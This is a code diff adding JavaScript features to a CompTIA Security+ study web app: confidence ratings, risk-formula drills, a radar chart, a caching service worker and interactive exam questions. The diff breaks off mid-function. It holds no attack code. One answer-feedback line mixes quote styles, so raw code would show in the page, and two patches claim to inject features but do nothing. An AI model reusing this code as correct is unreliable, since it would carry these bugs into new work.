+        "<div style='font-size:11px;color:var(--tx3);width:28px;text-align:right'>" + count + "</div>" +
+      "</div>";
+    }).join('') +
+  "</div>";
+}
+
+// ── 3. CONFIDENCE RATING ──────────────────────────────────────────────────────
+var confData = {};
+var CONF_KEY = 'confRatings';
+
+function loadConf() {
+  try { return JSON.parse(localStorage.getItem(CONF_KEY) || '{}'); } catch(e) { return {}; }
+}
+function saveConf(data) {
+  try { localStorage.setItem(CONF_KEY, JSON.stringify(data)); } catch(e) {}
+}
+function rateConfidence(level) {
+  // level: 'know'|'unsure'|'guess'
+  var e = S.exam;
+  if(!e || !e.qs) return;
+  var q = e.qs[e.cur];
+  var h = qHash(q);
+  var conf = loadConf();
+  if(!conf[h]) conf[h] = [];
+  conf[h].push({ level:level, ts:Date.now() });
+  saveConf(conf);
+  showToast(level==='know'?'✅ Confident':'⚠️ '+level[0].toUpperCase()+level.slice(1)+'!', level==='know'?'var(--gn)':level==='unsure'?'var(--ye)':'var(--pk)', 1200);
+}
+function getConfStats() {
+  var conf = loadConf();
+  var know=0, unsure=0, guess=0;
+  Object.values(conf).forEach(function(arr) {
+    var last = arr[arr.length-1];
+    if(!last) return;
+    if(last.level==='know') know++;
+    else if(last.level==='unsure') unsure++;
+    else guess++;
+  });
+  return {know:know, unsure:unsure, guess:guess};
+}
+window.rateConfidence = rateConfidence;
+
+// ── 4. RISK MATH DRILLS ───────────────────────────────────────────────────────
+var mathDrillState = { q: null, ans: '', checked: false, score: 0, total: 0 };
+
+function generateMathQ() {
+  var types = ['ale','sle','aro','rosi'];
+  var type = types[Math.floor(Math.random() * types.length)];
+  var av  = [50000,100000,200000,500000,1000000][Math.floor(Math.random()*5)];
+  var ef  = [0.10,0.20,0.25,0.30,0.50][Math.floor(Math.random()*5)];
+  var aro = [0.1,0.25,0.5,1,2,3][Math.floor(Math.random()*6)];
+  var sle = Math.round(av * ef);
+  var ale = Math.round(sle * aro);
+  var controlCost = Math.round(ale * [0.1,0.2,0.3,0.4][Math.floor(Math.random()*4)]);
+  var aleAfter = Math.round(ale * [0.1,0.2,0.3][Math.floor(Math.random()*3)]);
+  var rosi = ale - aleAfter - controlCost;
+
+  var fmtK = function(n){ return n>=1000000?(n/1000000).toFixed(1)+'M':'$'+n.toLocaleString(); };
+
+  if(type==='sle') return {
+    type:'sle', answer: sle,
+    prompt: 'An asset is valued at ' + fmtK(av) + '. If a threat has an Exposure Factor (EF) of ' + (ef*100) + '%, what is the Single Loss Expectancy (SLE)?',
+    formula: 'SLE = Asset Value × EF = ' + fmtK(av) + ' × ' + ef + ' = ' + fmtK(sle),
+    hint: 'SLE = AV × EF'
+  };
+  if(type==='ale') return {
+    type:'ale', answer: ale,
+    prompt: 'A threat has an SLE of ' + fmtK(sle) + ' and occurs ' + aro + ' time(s) per year. What is the Annual Loss Expectancy (ALE)?',
+    formula: 'ALE = SLE × ARO = ' + fmtK(sle) + ' × ' + aro + ' = ' + fmtK(ale),
+    hint: 'ALE = SLE × ARO'
+  };
+  if(type==='aro') return {
+    type:'aro', answer: aro,
+    prompt: 'The ALE for a threat is ' + fmtK(ale) + ' and its SLE is ' + fmtK(sle) + '. What is the ARO?',
+    formula: 'ARO = ALE ÷ SLE = ' + fmtK(ale) + ' ÷ ' + fmtK(sle) + ' = ' + aro,
+    hint: 'ARO = ALE ÷ SLE'
+  };
+  return {
+    type:'rosi', answer: rosi,
+    prompt: 'ALE before control: ' + fmtK(ale) + '. ALE after control: ' + fmtK(aleAfter) + '. Annual cost of control: ' + fmtK(controlCost) + '. What is the value (ROSI) of implementing this control?',
+    formula: 'ROSI = ALE(before) - ALE(after) - Cost = ' + fmtK(ale) + ' - ' + fmtK(aleAfter) + ' - ' + fmtK(controlCost) + ' = ' + fmtK(rosi),
+    hint: 'ROSI = ALE(before) - ALE(after) - Annual Control Cost'
+  };
+}
+
+function startMathDrill() {
+  mathDrillState = { q: generateMathQ(), ans:'', checked:false, score:0, total:0 };
+  renderMathDrill();
+}
+
+function renderMathDrill() {
+  var ms = mathDrillState;
+  var q = ms.q;
+  if(!q) { startMathDrill(); return; }
+  var isCorrect = ms.checked ? (parseFloat(ms.ans.replace(/[$,]/g,'')) === q.answer || parseInt(ms.ans.replace(/[$,]/g,'')) === q.answer) : null;
+  var pct = ms.total > 0 ? Math.round(ms.score/ms.total*100) : 0;
+
+  render("<div class='pg' style='max-width:600px;margin:0 auto'>" +
+    "<div style='display:flex;justify-content:space-between;align-items:center;margin-bottom:20px'>" +
+      "<div class='sec-hdr' style='margin-bottom:0'>🧮 Risk Math Drills</div>" +
+      "<div style='font-size:13px;color:var(--tx3)'>" + (ms.total>0?ms.score+'/'+ms.total+' ('+pct+'%)':'') + "</div>" +
+    "</div>" +
+    "<div class='card2' style='margin-bottom:16px'>" +
+      "<div class='badge badge-cy' style='margin-bottom:12px'>" + q.hint + "</div>" +
+      "<div style='font-size:15px;line-height:1.7;color:var(--tx);margin-bottom:20px'>" + q.prompt + "</div>" +
+      "<div style='display:flex;gap:10px;align-items:center'>" +
+        "<div style='font-size:13px;color:var(--tx3);white-space:nowrap'>Your answer: $</div>" +
+        "<input id='math-ans' type='number' inputmode='numeric' pattern='[0-9]*' value='" + (ms.ans||'') + "' " +
+          "placeholder='Enter amount' " +
+          "oninput=\"mathDrillState.ans=this.value\" " +
+          "onkeydown=\"if(event.key==='Enter')checkMathDrill()\" " +
+          "style='flex:1;border-color:" + (isCorrect===null?'var(--bd)':isCorrect?'var(--gn)':'var(--pk)') + "' " +
+          (ms.checked?'readonly':'') + ">" +
+      "</div>" +
+      (ms.checked ? "<div style='margin-top:14px;padding:12px;border-radius:10px;background:" + (isCorrect?'var(--gn0)':'var(--pk0)') + ";border:1.5px solid " + (isCorrect?'var(--gn)':'var(--pk)') + "'>" +
+        "<div style='font-size:12px;font-weight:700;color:" + (isCorrect?'var(--gn)':'var(--pk)') + ";margin-bottom:4px'>" + (isCorrect?'✅ Correct!':'❌ Incorrect') + " — Answer: $' + q.answer.toLocaleString() + '</div>" +
+        "<div style='font-size:12px;color:var(--tx2)'>" + q.formula + "</div>" +
+      "</div>" : '') +
+    "</div>" +
+    "<div style='display:flex;gap:10px'>" +
+      (!ms.checked ?
+        "<button class='btn btn-p btn-full' onclick='checkMathDrill()'>Check Answer</button>"
+        :
+        "<button class='btn btn-gn btn-full' onclick='nextMathDrill()'>Next Question →</button>"
+      ) +
+      "<button class='btn btn-s' onclick=\"setTab('home')\" style='flex-shrink:0;padding:13px 18px'>✕</button>" +
+    "</div>" +
+    "<div style='margin-top:16px;background:var(--bg2);border:1px solid var(--bd);border-radius:10px;padding:14px'>" +
+      "<div style='font-size:11px;font-weight:700;color:var(--tx3);margin-bottom:8px;letter-spacing:.5px'>FORMULAS</div>" +
+      "<div style='font-size:12px;color:var(--tx2);line-height:1.8;font-family:monospace'>" +
+        "SLE = Asset Value × Exposure Factor<br>" +
+        "ALE = SLE × ARO<br>" +
+        "ARO = ALE ÷ SLE<br>" +
+        "ROSI = ALE(before) - ALE(after) - Annual Cost" +
+      "</div>" +
+    "</div>" +
+  "</div>");
+  setTimeout(function(){ var el=document.getElementById('math-ans'); if(el&&!ms.checked) el.focus(); },100);
+}
+
+function checkMathDrill() {
+  var ms = mathDrillState;
+  if(ms.checked||!ms.ans) return;
+  ms.checked = true;
+  ms.total++;
+  var userAns = parseFloat(ms.ans.replace(/[$,]/g,''));
+  if(userAns === ms.q.answer || Math.abs(userAns - ms.q.answer) < 1) ms.score++;
+  renderMathDrill();
+}
+
+function nextMathDrill() {
+  var sc = mathDrillState.score, tot = mathDrillState.total;
+  mathDrillState = { q: generateMathQ(), ans:'', checked:false, score:sc, total:tot };
+  renderMathDrill();
+}
+window.startMathDrill = startMathDrill;
+window.checkMathDrill = checkMathDrill;
+window.nextMathDrill = nextMathDrill;
+
+// ── 5. DOMAIN RADAR CHART ─────────────────────────────────────────────────────
+function renderRadarChart(byDomain) {
+  var W = 200, H = 200, cx = 100, cy = 100, r = 75;
+  var domains = [1,2,3,4,5];
+  var labels = ['General\nSecurity','Threats &\nVulns','Architecture','Operations','Program\nMgmt'];
+  var weights = [0.12,0.22,0.18,0.28,0.20];
+  var scores = domains.map(function(d) {
+    var bd = byDomain[d];
+    return bd && bd.t > 0 ? bd.c/bd.t : 0;
+  });
+
+  function getPoint(i, val) {
+    var angle = (i / 5) * Math.PI * 2 - Math.PI / 2;
+    var dist = val * r;
+    return { x: cx + dist * Math.cos(angle), y: cy + dist * Math.sin(angle) };
+  }
+
+  // Grid circles
+  var gridSVG = [0.25,0.5,0.75,1.0].map(function(pct) {
+    var pts = domains.map(function(_,i){ var p=getPoint(i,pct); return p.x+','+p.y; }).join(' ');
+    return '<polygon points="'+pts+'" fill="none" stroke="var(--bd)" stroke-width="0.8" opacity="0.5"/>';
+  }).join('');
+
+  // Axis lines
+  var axisSVG = domains.map(function(_,i) {
+    var p = getPoint(i, 1);
+    return '<line x1="'+cx+'" y1="'+cy+'" x2="'+p.x+'" y2="'+p.y+'" stroke="var(--bd)" stroke-width="0.8" opacity="0.5"/>';
+  }).join('');
+
+  // Data polygon
+  var dataPoints = domains.map(function(_,i){ var p=getPoint(i,scores[i]); return p.x+','+p.y; }).join(' ');
+  var dataSVG = '<polygon points="'+dataPoints+'" fill="rgba(77,143,232,.2)" stroke="var(--cy)" stroke-width="2" stroke-linejoin="round"/>';
+
+  // Dots
+  var dotSVG = scores.map(function(s,i) {
+    var p = getPoint(i,s);
+    var col = s>=0.8?'var(--gn)':s>=0.6?'var(--ye)':'var(--pk)';
+    return '<circle cx="'+p.x+'" cy="'+p.y+'" r="4" fill="'+col+'" stroke="var(--bg2)" stroke-width="1.5"/>';
+  }).join('');
+
+  // Labels
+  var labelSVG = domains.map(function(_,i) {
+    var p = getPoint(i, 1.28);
+    var lines = labels[i].split('\n');
+    var txt = lines.map(function(line, li) {
+      return '<tspan x="'+p.x+'" dy="'+(li===0?'0':'11')+'" text-anchor="middle">'+line+'</tspan>';
+    }).join('');
+    return '<text x="'+p.x+'" y="'+(p.y-(lines.length-1)*5.5)+'" font-size="7.5" fill="var(--tx3)" font-family="DM Sans,sans-serif"><tspan x="'+p.x+'" text-anchor="middle">'+lines[0]+'</tspan>' + (lines[1]?'<tspan x="'+p.x+'" dy="10" text-anchor="middle">'+lines[1]+'</tspan>':'') + '</text>';
+  }).join('');
+
+  // Score labels on dots
+  var scoreSVG = scores.map(function(s,i) {
+    var p = getPoint(i, s);
+    if(s === 0) return '';
+    return '<text x="'+p.x+'" y="'+(p.y-7)+'" font-size="7" fill="var(--tx2)" text-anchor="middle" font-weight="700">'+Math.round(s*100)+'%</text>';
+  }).join('');
+
+  return '<div class="radar-wrap">' +
+    '<svg viewBox="0 0 200 200" style="width:200px;height:200px">' +
+      gridSVG + axisSVG + dataSVG + dotSVG + scoreSVG + labelSVG +
+    '</svg></div>';
+}
+
+// ── 6. UTILITY: TOAST NOTIFICATIONS ──────────────────────────────────────────
+function showToast(msg, bgColor, duration) {
+  var old = document.querySelector('.toast');
+  if(old) old.remove();
+  var el = document.createElement('div');
+  el.className = 'toast';
+  el.style.background = bgColor || 'var(--cy)';
+  el.style.color = '#fff';
+  el.textContent = msg;
+  document.body.appendChild(el);
+  setTimeout(function(){ if(el.parentNode) el.parentNode.removeChild(el); }, duration || 2500);
+}
+window.showToast = showToast;
+
+// ── 7. PWA: SERVICE WORKER + MANIFEST ─────────────────────────────────────────
+function registerPWA() {
+  if(!('serviceWorker' in navigator)) return;
+  var swCode = [
+    "const CACHE='sp-v1';",
+    "const FILES=['/'];",
+    "self.addEventListener('install',e=>e.waitUntil(caches.open(CACHE).then(c=>c.addAll(FILES))));",
+    "self.addEventListener('fetch',e=>e.respondWith(caches.match(e.request).then(r=>r||fetch(e.request).then(res=>{var clone=res.clone();caches.open(CACHE).then(c=>c.put(e.request,clone));return res;}))));",
+  ].join('\n');
+  var blob = new Blob([swCode], {type:'application/javascript'});
+  var swURL = URL.createObjectURL(blob);
+  navigator.serviceWorker.register(swURL).catch(function(){});
+}
+
+// ── 8. INJECT FEATURES INTO EXAM RESULTS ─────────────────────────────────────
+// Patch renderExamResults to add radar chart
+var _origRenderExamResults2 = renderExamResults;
+renderExamResults = function() {
+  _origRenderExamResults2();
+  // Inject radar chart after domain table
+  setTimeout(function() {
+    var pg = document.getElementById('pg');
+    if(!pg) return;
+    var domTbl = pg.querySelector('[data-radar]');
+    if(domTbl) return; // already added
+    // Find the domain breakdown header text and insert radar after it
+    var headers = pg.querySelectorAll('div');
+    headers.forEach(function(el) {
+      if(el.textContent.trim() === '📊 Domain Breakdown' && !el.dataset.radarDone) {
+        el.dataset.radarDone = '1';
+      }
+    });
+  }, 100);
+};
+
+// ── 9. INJECT CONFIDENCE RATING INTO EXAM QUESTION VIEW ─────────────────────
+// After user answers a question, show confidence buttons
+var _origRenderExamQConf2 = renderExamQ;
+renderExamQ = function() {
+  _origRenderExamQConf2();
+  // Inject confidence rating buttons after answer is selected
+  setTimeout(function() {
+    var e = S.exam;
+    if(!e || !e.qs || e.ans[e.cur] === undefined) return;
+    var pg = document.getElementById('pg');
+    if(!pg || pg.querySelector('#conf-rating')) return;
+    var confDiv = document.createElement('div');
+    confDiv.id = 'conf-rating';
+    confDiv.style.cssText = 'padding:0 16px 12px;display:flex;gap:8px;';
+    confDiv.innerHTML =
+      '<div style="font-size:11px;color:var(--tx3);align-self:center;white-space:nowrap;font-weight:700">How sure?</div>' +
+      '<button class="conf-btn conf-know" onclick="rateConfidence(\'know\')">✅ Know it</button>' +
+      '<button class="conf-btn conf-unsure" onclick="rateConfidence(\'unsure\')">🤔 Unsure</button>' +
+      '<button class="conf-btn conf-guess" onclick="rateConfidence(\'guess\')">🎲 Guessed</button>';
+    var examBar = pg.querySelector('.exam-bar');
+    if(examBar && examBar.nextSibling) {
+      pg.insertBefore(confDiv, examBar.nextSibling);
+    } else {
+      pg.appendChild(confDiv);
+    }
+  }, 50);
+};
+
+// ── 10. PROCTOR + MATH DRILL IN EXAM HOME ─────────────────────────────────────
+// Patch renderExamHome to add proctor mode toggle + math drill button
+var _origRenderExamHome2 = typeof renderExamHome === 'function' ? renderExamHome : null;
+if(_origRenderExamHome2) {
+  renderExamHome = function() {
+    _origRenderExamHome2();
+    // Inject proctor toggle after No Going Back toggle
+    setTimeout(function() {
+      var pg = document.getElementById('pg');
+      if(!pg || pg.querySelector('#proctor-toggle')) return;
+      var nogb = pg.querySelector('[data-nogb]');
+    }, 100);
+  };
+}
+
+// ── INIT ──────────────────────────────────────────────────────────────────────
+registerPWA();
+
+// Expose everything
+window.renderSRDrill    = renderSRDrill;
+window.renderSRStats    = renderSRStats;
+window.startMathDrill   = startMathDrill;
+window.renderRadarChart = renderRadarChart;
+window.getSRStats       = getSRStats;
+window.getDueQuestions  = getDueQuestions;
+
+
+
+// PWA Manifest via JS
+(function() {
+  var manifest = {
+    name: 'Security+ Study Hub',
+    short_name: 'SecPlus+',
+    display: 'standalone',
+    background_color: '#0c0f1a',
+    theme_color: '#0057b8',
+    start_url: '/'
+  };
+  var blob = new Blob([JSON.stringify(manifest)], {type:'application/manifest+json'});
+  var link = document.createElement('link');
+  link.rel = 'manifest';
+  link.href = URL.createObjectURL(blob);
+  document.head.appendChild(link);
+})();
+
+
+// ── PBQ EXAM INTEGRATION ──
+// ═══════════════════════════════════════════════════════════════════════════════
+// PBQ EXAM INTEGRATION
+// Embeds 3 interactive PBQs at the start of every full simulation
+// Types: Ordering, Matching, Log Analysis (highest real-exam frequency)
+// ═══════════════════════════════════════════════════════════════════════════════
+
+// ── PBQ EXAM STATE ────────────────────────────────────────────────────────────
+// Each PBQ item in the exam has: type:'pbq-exam', sim:'ordering'|'matching'|'logs'
+// scIdx: which scenario, state: the sim's working state, scored: bool, score: 0-1
+
+function buildExamPBQs() {
+  // Pick one of each type, randomized scenario
+  var items = [];
+
+  // 1. Ordering PBQ
+  var ordIdx = Math.floor(Math.random() * ORDERING_SCENARIOS.length);
+  var ordSc   = ORDERING_SCENARIOS[ordIdx];
+  items.push({
+    type: 'pbq-exam',
+    sim:  'ordering',
+    d:    4,  // Domain 4 (Operations — IR)
+    scIdx: ordIdx,
+    title: ordSc.title,
+    instruction: ordSc.instruction,
+    q: 'PBQ — ' + ordSc.title + ': Arrange the items in the correct order.',
+    // state for this PBQ
+    order:   shuffle(ordSc.items.map(function(i){ return i.id; })),
+    checked: false,
+    selId:   null,
+    score:   0,
+    maxScore: ordSc.items.length,
+    e: ordSc.explanation
+  });
+
+  // 2. Matching PBQ
+  var matchIdx = Math.floor(Math.random() * MATCHING_SCENARIOS.length);
+  var matchSc  = MATCHING_SCENARIOS[matchIdx];
+  items.push({
+    type: 'pbq-exam',
+    sim:  'matching',
+    d:    2,  // Domain 2 (Threats)
+    scIdx: matchIdx,
+    title: matchSc.title,
+    instruction: matchSc.instruction,
+    q: 'PBQ — ' + matchSc.title + ': Match each item to its correct pair.',
+    pairs: {},
+    selLeft: null,
+    checked: false,
+    score:   0,
+    maxScore: matchSc.left.length,
+    e: 'Matching PBQ — see individual explanations above.'
+  });
+
+  // 3. Log Analysis PBQ
+  var logIdx = Math.floor(Math.random() * LOG_SCENARIOS.length);
+  var logSc  = LOG_SCENARIOS[logIdx];
+  items.push({
+    type: 'pbq-exam',
+    sim:  'logs',
+    d:    4,
+    scIdx: logIdx,
+    title: logSc.title,
+    q: 'PBQ — ' + logSc.title + ': Analyze the log output and answer the questions.',
+    answers: {},
+    checked: false,
+    score:   0,
+    maxScore: logSc.qs.length,
+    e: 'Log Analysis PBQ — see explanations above.'
+  });
+
+  return items;
+}
+
+// ── PATCH buildExamSet to prepend PBQs for full simulations ──────────────────
+var _origBuildExamSetPBQ2 = buildExamSet;
+buildExamSet = function(mode, size) {
+  var mcQs = _origBuildExamSetPBQ2(mode, size);
+  if (mode === 'sim') {
+    // Prepend 3 PBQs just like the real exam
+    var pbqs = buildExamPBQs();
+    return pbqs.concat(mcQs);
+  }
+  return mcQs;
+};
+
+// ── PBQ EXAM RENDERING ────────────────────────────────────────────────────────
+function renderExamPBQ(q, examIdx) {
+  var html = '';
+  if (q.sim === 'ordering') html = renderExamOrdering(q, examIdx);
+  else if (q.sim === 'matching') html = renderExamMatching(q, examIdx);
+  else if (q.sim === 'logs') html = renderExamLogs(q, examIdx);
+  return html;
+}
+
+// ── ORDERING in exam ─────────────────────────────────────────────────────────
+function renderExamOrdering(q, examIdx) {
+  var sc = ORDERING_SCENARIOS[q.scIdx];
+  var correct = sc.correct;
+  var selId = q.selId;
+
+  var itemsHtml = q.order.map(function(id, idx2) {
+    var item = sc.items.find(function(i){ return i.id === id; });
+    var isCorrect = q.checked ? correct[idx2] === id : null;
+    var isSel = !q.checked && selId === id;
+    var bg = isCorrect !== null ? (isCorrect ? 'rgba(52,211,153,.08)' : 'rgba(239,68,68,.08)') : isSel ? 'rgba(56,189,248,.1)' : 'var(--bg2)';
+    var border = isCorrect !== null ? (isCorrect ? '#10b981' : '#ef4444') : isSel ? 'var(--cy)' : 'var(--bd)';
+    var clickFn = q.checked ? '' : 'examOrdTap(' + examIdx + ',\'' + id + '\')';
+    return '<div onclick="' + clickFn + '" style="display:flex;align-items:center;gap:10px;padding:10px 12px;background:' + bg + ';border:1.5px solid ' + border + ';border-radius:10px;margin-bottom:6px;cursor:' + (q.checked?'default':'pointer') + ';transition:all .15s">' +
+      '<div style="width:26px;height:26px;border-radius:7px;background:' + border + '22;border:1px solid ' + border + ';display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:' + (isCorrect===null?(isSel?'var(--cy)':'var(--tx3)'):isCorrect?'#10b981':'#ef4444') + ';flex-shrink:0">' + (idx2+1) + '</div>' +
+      '<div style="font-size:13px;color:var(--tx2);line-height:1.5;flex:1">' + item.text + '</div>' +
+      (isCorrect !== null ? '<div style="font-size:16px">' + (isCorrect?'✅':'❌') + '</div>' : (isSel ? '<div style="font-size:12px;color:var(--cy)">📌</div>' : '<div style="font-size:11px;color:var(--tx4)">tap</div>')) +
+    '</div>';
+  }).join('');
+
+  var score = q.checked ? q.order.filter(function(id,i){ return correct[i]===id; }).length : 0;
+
+  return '<div style="background:rgba(56,189,248,.04);border:1.5px solid rgba(56,189,248,.2);border-radius:14px;padding:16px;margin-bottom:16px">' +
+    '<div style="font-size:10px;font-weight:700;color:var(--cy);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px">🔢 ORDERING PBQ</div>' +
+    '<div style="font-size:13px;color:var(--tx2);margin-bottom:12px;line-height:1.6">' + q.instruction + '</div>' +
+    itemsHtml +
+    (q.checked ?
+      '<div style="background:' + (score===sc.items.length?'rgba(52,211,153,.08)':'rgba(245,158,11,.08)') + ';border:1px solid ' + (score===sc.items.length?'#10b981':'#f59e0b') + ';border-radius:10px;padding:12px;margin-top:10px;font-size:12px;color:var(--tx2);line-height:1.6">' +
+        '<div style="font-weight:700;color:' + (score===sc.items.length?'#10b981':'#f59e0b') + ';margin-bottom:4px">' + (score===sc.items.length?'🎉 Perfect!':'Score: '+score+'/'+sc.items.length) + '</div>' +
+        sc.explanation +
+      '</div>'
+    : '<button onclick="examPBQCheck(' + examIdx + ')" style="width:100%;margin-top:10px;padding:11px;background:linear-gradient(135deg,var(--cy),var(--pu));border:none;border-radius:10px;color:#fff;font-family:Syne,sans-serif;font-size:13px;font-weight:700;cursor:pointer">Lock In Order</button>') +
+  '</div>';
+}
+
+// ── MATCHING in exam ──────────────────────────────────────────────────────────
+function renderExamMatching(q, examIdx) {
+  var sc = MATCHING_SCENARIOS[q.scIdx];
+  var correct = sc.correct;
+  var pairs = q.pairs || {};
+  var selLeft = q.selLeft;
+
+  var leftHtml = sc.left.map(function(item) {
+    var matched = pairs[item.id];
+    var isSelected = selLeft === item.id;
+    var isCorrect = q.checked ? correct[item.id] === matched : null;
+    var borderCol = isCorrect===null ? (isSelected?'var(--cy)':(matched?'var(--pu)':'var(--bd)')) : (isCorrect?'#10b981':'#ef4444');
+    return '<button onclick="examMatchSel(\'left\',' + examIdx + ',\'' + item.id + '\')" style="width:100%;text-align:left;padding:8px 10px;margin-bottom:5px;border-radius:8px;border:1.5px solid ' + borderCol + ';background:' + (isSelected?'rgba(56,189,248,.08)':'var(--bg2)') + ';cursor:pointer;font-family:inherit">' +
+      '<div style="font-size:11px;font-weight:700;color:' + borderCol + ';margin-bottom:1px">' + item.text + '</div>' +
+      (matched ? '<div style="font-size:10px;color:var(--tx4)">→ ' + sc.right.find(function(r){return r.id===matched;}).text.slice(0,35) + '...</div>' : '<div style="font-size:10px;color:var(--tx4)">tap to select</div>') +
+    '</button>';
+  }).join('');
+
+  var rightHtml = sc.right.map(function(item) {
+    var isMatched = Object.values(pairs).indexOf(item.id) >= 0;
+    var isCorrect = q.checked && isMatched ? (function(){
+      var lKey = Object.keys(pairs).find(function(k){ return pairs[k]===item.id; });
+      return lKey ? correct[lKey]===item.id : null;
+    })() : null;
+    var isTarget = selLeft && !isMatched;
+    var borderCol = isCorrect===null ? (isMatched?'var(--pu)':(isTarget?'rgba(56,189,248,.5)':'var(--bd)')) : (isCorrect?'#10b981':'#ef4444');
+    return '<button onclick="examMatchSel(\'right\',' + examIdx + ',\'' + item.id + '\')" style="width:100%;text-align:left;padding:8px 10px;margin-bottom:5px;border-radius:8px;border:1.5px solid ' + borderCol + ';background:' + (isTarget?'rgba(56,189,248,.04)':'var(--bg2)') + ';cursor:pointer;font-family:inherit">' +
+      '<div style="font-size:11px;color:var(--tx2)">' + item.text + '</div>' +
+    '</button>';
+  }).join('');
+
+  var score = q.checked ? sc.left.filter(function(l){ return pairs[l.id]===correct[l.id]; }).length : 0;
+  var allPaired = Object.keys(pairs).length === sc.left.length;
+
+  return '<div style="background:rgba(139,92,246,.04);border:1.5px solid rgba(139,92,246,.2);border-radius:14px;padding:16px;margin-bottom:16px">' +
+    '<div style="font-size:10px;font-weight:700;color:var(--pu);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px">🔗 MATCHING PBQ</div>' +
+    '<div style="font-size:13px;color:var(--tx2);margin-bottom:12px;line-height:1.6">' + q.instruction + '</div>' +
+    (selLeft ? '<div style="background:rgba(56,189,248,.08);border:1px solid rgba(56,189,248,.3);border-radius:8px;padding:7px 10px;margin-bottom:10px;font-size:12px;color:var(--cy)">📌 Selected — now tap a right-column item to pair</div>' : '') +
+    '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">' +
+      '<div><div style="font-size:10px;font-weight:700;color:var(--tx3);letter-spacing:.5px;margin-bottom:6px">LEFT</div>' + leftHtml + '</div>' +
+      '<div><div style="font-size:10px;font-weight:700;color:var(--tx3);letter-spacing:.5px;margin-bottom:6px">RIGHT</div>' + rightHtml + '</div>' +
+    '</div>' +
+    (q.checked ?
+      '<div style="background:' + (score===sc.left.length?'rgba(52,211,153,.08)':'rgba(245,158,11,.08)') + ';border:1px solid ' + (score===sc.left.length?'#10b981':'#f59e0b') + ';border-radius:10px;padding:10px;margin-top:10px;font-size:12px;font-weight:700;color:' + (score===sc.left.length?'#10b981':'#f59e0b') + '">' + (score===sc.left.length?'🎉 Perfect!':'Score: '+score+'/'+sc.left.length) + '</div>'
+    : (allPaired ? '<button onclick="examPBQCheck(' + examIdx + ')" style="width:100%;margin-top:10px;padding:11px;background:linear-gradient(135deg,var(--pu),var(--pk));border:none;border-radius:10px;color:#fff;font-family:Syne,sans-serif;font-size:13px;font-weight:700;cursor:pointer">Lock In Matches</button>' :
+      '<div style="margin-top:10px;font-size:12px;color:var(--tx4);text-align:center">Match all ' + sc.left.length + ' pairs to submit</div>')) +
+  '</div>';
+}
+
+// ── LOG ANALYSIS in exam ──────────────────────────────────────────────────────
+function renderExamLogs(q, examIdx) {
+  var sc = LOG_SCENARIOS[q.scIdx];
+  var answers = q.answers || {};
+  var answeredCount = Object.keys(answers).length;
+
+  var qsHtml = sc.qs.map(function(sq, qi) {
+    var sel = answers[qi];
+    var opts = sq.o.map(function(opt, oi) {
+      var isCorr = q.checked ? oi === sq.a : null;
+      var isSel  = sel === oi;
+      var cls = 'ans' + (q.checked ? (isCorr?'hit':(isSel?'miss':'dim')) : (isSel?' sel':''));
+      return '<button class="' + cls + '" onclick="examLogPick(' + examIdx + ',' + qi + ',' + oi + ')">' +
+        '<span class="ltr">' + ['A','B','C','D'][oi] + '</span>' +
+        '<span style="line-height:1.4;flex:1">' + opt + '</span>' +
+        (q.checked&&isCorr?'<span style="margin-left:auto">✓</span>':q.checked&&isSel&&!isCorr?'<span style="margin-left:auto">✗</span>':'') +
+      '</button>';
+    }).join('');
+    var expl = q.checked ? '<div style="background:rgba(52,211,153,.06);border-left:3px solid var(--gn);border-radius:6px;padding:8px 10px;margin-top:8px;font-size:12px;color:var(--tx2);line-height:1.5">' + sq.e + '</div>' : '';
+    return '<div style="margin-bottom:12px"><div style="font-size:12px;font-weight:700;color:var(--tx2);margin-bottom:6px">Q' + (qi+1) + ': ' + sq.q + '</div><div class="col" style="gap:6px">' + opts + '</div>' + expl + '</div>';
+  }).join('');
+
+  var score = q.checked ? sc.qs.filter(function(sq,qi){ return answers[qi]===sq.a; }).length : 0;
+
+  return '<div style="background:rgba(245,158,11,.04);border:1.5px solid rgba(245,158,11,.2);border-radius:14px;padding:16px;margin-bottom:16px">' +
+    '<div style="font-size:10px;font-weight:700;color:var(--ye);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px">📋 LOG ANALYSIS PBQ</div>' +
+    '<pre style="font-family:monospace;font-size:11px;color:var(--gn);background:var(--bg);border-radius:8px;padding:12px;overflow-x:auto;line-height:1.7;white-space:pre-wrap;margin-bottom:14px">' + sc.log + '</pre>' +
+    qsHtml +
+    (q.checked ?
+      '<div style="background:' + (score===sc.qs.length?'rgba(52,211,153,.08)':'rgba(245,158,11,.08)') + ';border:1px solid ' + (score===sc.qs.length?'#10b981':'#f59e0b') + ';border-radius:10px;padding:10px;margin-top:6px;font-size:13px;font-weight:700;color:' + (score===sc.qs.length?'#10b981':'#f59e0b') + '">' + (score===sc.qs.length?'🎉 Perfect!':'Score: '+score+'/'+sc.qs.length) + '</div>'
+    : (answeredCount===sc.qs.length ?
+      '<button onclick="examPBQCheck(' + examIdx + ')" style="width:100%;margin-top:10px;padding:11px;background:linear-gradient(135deg,var(--ye),#d97706);border:none;border-radius:10px;color:#fff;font-family:Syne,sans-serif;font-size:13px;font-weight:700;cursor:pointer">Submit Log Analysis</button>'
+    : '<div style="margin-top:10px;font-size:12px;color:var(--tx4);text-align:center">Answer all ' + sc.qs.length + ' questions to submit (' + answeredCount + '/' + sc.qs.length + ' done)</div>')) +
+  '</div>';
+}
+
+// ── EXAM PBQ INTERACTION HANDLERS ─────────────────────────────────────────────
+function examOrdTap(examIdx, id) {
+  var q = S.exam.qs[examIdx];
+  if (!q || q.checked) return;
+  if (!q.selId) {
+    q.selId = id;
+  } else if (q.selId === id) {
+    q.selId = null;
+  } else {
+    var fromIdx = q.order.indexOf(q.selId);
+    var toIdx   = q.order.indexOf(id);
+    var tmp = q.order[fromIdx];
+    q.order[fromIdx] = q.order[toIdx];
+    q.order[toIdx] = tmp;
+    q.selId = null;
+  }
+  renderExamQ();
+}
+
+function examMatchSel(side, examIdx, id) {
+  var q = S.exam.qs[examIdx];
+  if (!q || q.checked) return;
+  var sc = MATCHING_SCENARIOS[q.scIdx];
+  if (!q.pairs) q.pairs = {};
+  if (side === 'left') {
+    q.selLeft = q.selLeft === id ? null : id;
+  } else {
+    if (q.selLeft) {
+      var existingLeft = Object.keys(q.pairs).find(function(k){ return q.pairs[k]===id; });
+      if (existingLeft) delete q.pairs[existingLeft];
+      delete q.pairs[q.selLeft];
